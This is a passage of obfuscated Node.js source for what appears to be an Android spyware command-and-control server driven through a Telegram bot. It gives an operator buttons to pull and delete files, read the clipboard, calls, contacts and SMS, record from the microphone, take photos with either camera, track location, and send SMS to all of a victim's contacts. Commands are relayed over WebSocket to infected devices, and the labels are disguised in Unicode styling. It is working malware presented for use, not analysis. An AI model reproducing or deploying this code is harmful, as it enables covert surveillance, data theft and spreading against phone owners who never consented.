    _0x2f3f8b = _0x9f09ec.split(':')[0],
    _0x39894d = _0x9f09ec.split(':')[1]
  
  if (_0x2f3f8b == 'device') {
    appBot.editMessageText(
      '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE5B\uD835\uDE64\uD835\uDE67 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A : <b>' +
        (appClients.get(_0x39894d)?.model || 'Unknown') +
        '</b>',
      {
        width: 10000,
        chat_id: id,
        message_id: _0x440ba5.message_id,
        reply_markup: {
          inline_keyboard: [
            [
              { text: '\uD835\uDE3C\uD835\uDE65\uD835\uDE65\uD835\uDE68', callback_data: 'apps:' + _0x39894d },
              { text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE5E\uD835\uDE63\uD835\uDE5B\uD835\uDE64', callback_data: 'device_info:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE42\uD835\uDE5A\uD835\uDE69 \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A', callback_data: 'file:' + _0x39894d },
              { text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A', callback_data: 'delete_file:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE3E\uD835\uDE61\uD835\uDE5E\uD835\uDE65\uD835\uDE57\uD835\uDE64\uD835\uDE56\uD835\uDE67\uD835\uDE59', callback_data: 'clipboard:' + _0x39894d },
              { text: '\uD835\uDE48\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A', callback_data: 'microphone:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE48\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56', callback_data: 'camera_main:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56', callback_data: 'camera_selfie:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', callback_data: 'location:' + _0x39894d },
              { text: '\uD835\uDE4F\uD835\uDE64\uD835\uDE56\uD835\uDE68\uD835\uDE69', callback_data: 'toast:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE3E\uD835\uDE56\uD835\uDE61\uD835\uDE61\uD835\uDE68', callback_data: 'calls:' + _0x39894d },
              { text: '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68', callback_data: 'contacts:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE51\uD835\uDE5E\uD835\uDE57\uD835\uDE67\uD835\uDE56\uD835\uDE69\uD835\uDE5A', callback_data: 'vibrate:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', callback_data: 'show_notification:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\uD835\uDE68', callback_data: 'messages:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A', callback_data: 'send_message:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE4B\uD835\uDE61\uD835\uDE56\uD835\uDE6E \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64', callback_data: 'play_audio:' + _0x39894d },
              { text: '\uD835\uDE4E\uD835\uDE69\uD835\uDE64\uD835\uDE65 \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64', callback_data: 'stop_audio:' + _0x39894d },
            ],
            [
              { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68', callback_data: 'send_message_to_all:' + _0x39894d },
            ],
          ],
        },
        parse_mode: 'HTML',
      }
    )
  }

  const quickCmds = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
  if (quickCmds.includes(_0x2f3f8b)) {
    appSocket.clients.forEach(c => { if (c.uuid == _0x39894d) c.send(_0x2f3f8b) })
    appBot.deleteMessage(id, _0x440ba5.message_id)
    sendWaitMsg()
  }

  if (_0x2f3f8b == 'send_message') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64...', { reply_markup: { force_reply: true } })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'send_message_to_all') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A...', { reply_markup: { force_reply: true } })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'file') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D...', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'delete_file') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D...', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'microphone') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C...', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'toast') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A...', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'show_notification') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A...', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = _0x39894d
  }
  if (_0x2f3f8b == 'play_audio') {
    appBot.deleteMessage(id, _0x440ba5.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64...', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = _0x39894d
  }
})

function sendWaitMsg() {
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
    {
      parse_mode: 'HTML',
      reply_markup: {
        keyboard: [
          ['\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'],
          ['\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'],
        ],
        resize_keyboard: true,
      },
    }
  )
}

// 🛡 Keep Server Alive Pinger 
setInterval(function () {
  appSocket.clients.forEach(function (_0x41c8f7) {
    if (_0x41c8f7.readyState === webSocket.OPEN) {
        _0x41c8f7.send('ping')
    }
  })
  try {
    const myUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 8999}`;
    axios.get(myUrl).catch(()=> {})
  } catch (e) {}
}, 5000)

appServer.listen(process.env.PORT || 8999, () => {
    console.log("🔥 Extreme Advance System Online Without Conflicts!");
});
